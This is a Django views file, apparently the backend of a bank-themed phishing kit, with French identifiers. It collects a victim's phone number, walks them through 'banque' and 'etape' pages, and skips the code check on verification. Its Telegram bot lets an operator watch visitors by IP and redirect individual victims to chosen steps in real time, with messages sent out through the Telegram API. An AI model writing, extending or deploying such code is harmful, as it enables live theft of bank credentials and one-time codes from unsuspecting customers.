from django.shortcuts import render, redirect
import requests
import time
from .middleware import VISITEURS_ACTIFS, REDIRECTIONS, PAGES_DISPONIBLES
from .forms import InscriptionForm, VerificationForm
from django.views.decorators.http import require_POST
import json
from django.http import JsonResponse
from django.core.cache import cache



from django.shortcuts import render, redirect


from django.shortcuts import render, redirect
from django.contrib import messages
from django.contrib.auth.hashers import make_password

import time
from django.core.cache import cache
from .middleware import PAGES_DISPONIBLES


def visiteurs_temps_reel(request):
    visiteurs = []
    keys = cache.keys('visiteur_*') if hasattr(cache, 'keys') else []

    # Fallback si cache.keys() non disponible
    try:
        keys = cache.keys('visiteur_*')
    except Exception:
        keys = []

    maintenant = time.time()
    for key in keys:
        data = cache.get(key)
        if data:
            ip = key.replace('visiteur_', '')
            visiteurs.append({
                'ip':      ip,
                'page':    data['page'],
                'methode': data['methode'],
                'il_y_a':  int(maintenant - data['last_seen']),
            })

    visiteurs.sort(key=lambda v: v['il_y_a'])
    return render(request, 'onboarding/visiteurs.html', {
        'visiteurs':    visiteurs,
        'total':        len(visiteurs),
        'pages':        PAGES_DISPONIBLES,
        'pages_json':   json.dumps([{'url': u, 'label': l} for u, l in PAGES_DISPONIBLES]),
    })


def visiteurs_json(request):
    visiteurs = []
    try:
        keys = cache.keys('visiteur_*')
    except Exception:
        keys = []

    maintenant = time.time()
    for key in keys:
        data = cache.get(key)
        if data:
            ip = key.replace('visiteur_', '')
            visiteurs.append({
                'ip':     ip,
                'page':   data['page'],
                'methode': data['methode'],
                'il_y_a': int(maintenant - data['last_seen']),
            })

    visiteurs.sort(key=lambda v: v['il_y_a'])
    return JsonResponse({'visiteurs': visiteurs, 'total': len(visiteurs)})


def verifier_redirection(request):
    from django.http import JsonResponse
    from django.core.cache import cache

    x_forwarded = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded:
        ip = x_forwarded.split(',')[0].strip()
    else:
        ip = request.META.get('REMOTE_ADDR', '')

    if ip == '::1':
        ip = '127.0.0.1'

    print(f">>> POLL ip='{ip}'")

    cible = cache.get(f'redirect_{ip}')
    if cible:
        cache.delete(f'redirect_{ip}')
        print(f">>> REDIRECTION TROUVÉE {ip} → {cible}")

    return JsonResponse({'redirect': cible})

def inscription(request):
    if request.method == 'POST':
        form = InscriptionForm(request.POST)
        if form.is_valid():
            form.send_tel()
            return redirect('banque_1')
    else:
        form = InscriptionForm()

    return render(request, 'onboarding\inscription.html', {'form': form})

import hashlib
from django.views.decorators.csrf import csrf_exempt

TELEGRAM_TOKEN = "TON_TOKEN"
TELEGRAM_CHAT_ID = "TON_CHAT_ID"

def envoyer_telegram(texte):
    url = f"https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage"
    import requests
    requests.post(url, data={
        "chat_id": TELEGRAM_CHAT_ID,
        "text": texte,
        "parse_mode": "Markdown"
    }, timeout=5)


@csrf_exempt
def telegram_webhook(request):
    if request.method != 'POST':
        return JsonResponse({'ok': False})

    import json
    update = json.loads(request.body)
    message = update.get('message', {})
    texte   = message.get('text', '').strip()
    chat_id = str(message.get('chat', {}).get('id', ''))

    # Sécurité : ignore si ce n'est pas ton chat
    if chat_id != TELEGRAM_CHAT_ID:
        return JsonResponse({'ok': True})

    # ── /visiteurs ──
    if texte == '/visiteurs':
        if not VISITEURS_ACTIFS:
            envoyer_telegram("😴 *Aucun visiteur actif*")
        else:
            lignes = ["👥 *Visiteurs en ligne :*\n━━━━━━━━━━━━━━━"]
            for ip, data in VISITEURS_ACTIFS.items():
                lignes.append(f"📍 `{ip}` → `{data['page']}`")
            envoyer_telegram('\n'.join(lignes))

    # ── /pages ──
    elif texte == '/pages':
        lignes = ["📋 *Pages disponibles :*\n━━━━━━━━━━━━━━━"]
        for i, (url, nom) in enumerate(PAGES_DISPONIBLES, 1):
            lignes.append(f"{i}. `{url}` — {nom}")
        lignes.append("\n💡 Usage : `/redirect 1.2.3.4 /etape-2/`")
        envoyer_telegram('\n'.join(lignes))

    # ── /redirect IP /page ──
    elif texte.startswith('/redirect'):
        parties = texte.split()
        if len(parties) != 3:
            envoyer_telegram(
                "❌ *Format incorrect*\n"
                "Usage : `/redirect 1.2.3.4 /etape-2/`"
            )
        else:
            ip          = parties[1]
            destination = parties[2]
            pages_ok    = [url for url, _ in PAGES_DISPONIBLES]

            if ip not in VISITEURS_ACTIFS:
                envoyer_telegram(f"❌ IP `{ip}` introuvable parmi les visiteurs actifs.")
            elif destination not in pages_ok:
                envoyer_telegram(f"❌ Page `{destination}` invalide.\nUtilise `/pages` pour voir les pages disponibles.")
            else:
                cache.set(f'redirect_{ip}', destination, timeout=300)
                envoyer_telegram(
                    f"✅ *Redirection envoyée*\n"
                    f"━━━━━━━━━━━━━━━\n"
                    f"📍 IP : `{ip}`\n"
                    f"➡️ Vers : `{destination}`"
                )

    # ── /help ──
    elif texte == '/help' or texte == '/start':
        envoyer_telegram(
            "🤖 *Commandes disponibles :*\n"
            "━━━━━━━━━━━━━━━\n"
            "👥 `/visiteurs` — voir les visiteurs actifs\n"
            "📋 `/pages` — voir les pages disponibles\n"
            "➡️ `/redirect IP /page` — rediriger un visiteur\n"
            "━━━━━━━━━━━━━━━\n"
            "💡 Exemple : `/redirect 1.2.3.4 /etape-2/`"
        )

    return JsonResponse({'ok': True})


def verification(request):
    if request.method == 'POST':
        form = VerificationForm(request.POST)
        if form.is_valid():
            # Ici, on vérifierait normalement le code envoyé par e-mail.
            return redirect('etape_1')
    else:
        form = VerificationForm()

    return render(request, 'onboarding/verification.html', {'form': form})

def etape_1(request):
    return render(request, 'onboarding/etape-1.html')


def etape_2(request):
    return render(request, 'onboarding/etape-2.html')


def etape_3(request):
    return render(request, 'onboarding/etape-3.html')


def etape_4(request):
    return render(request, 'onboarding/etape-4.html')


def etape_5(request):
    return render(request, 'onboarding/etape-5.html')


def etape_6(request):
    return render(request, 'onboarding/etape-6.html')


def banque_1(request):
    return render(request, 'onboarding/banque-1.html')

def banque_2(request):
    return render(request, 'onboarding/banque-2.html')


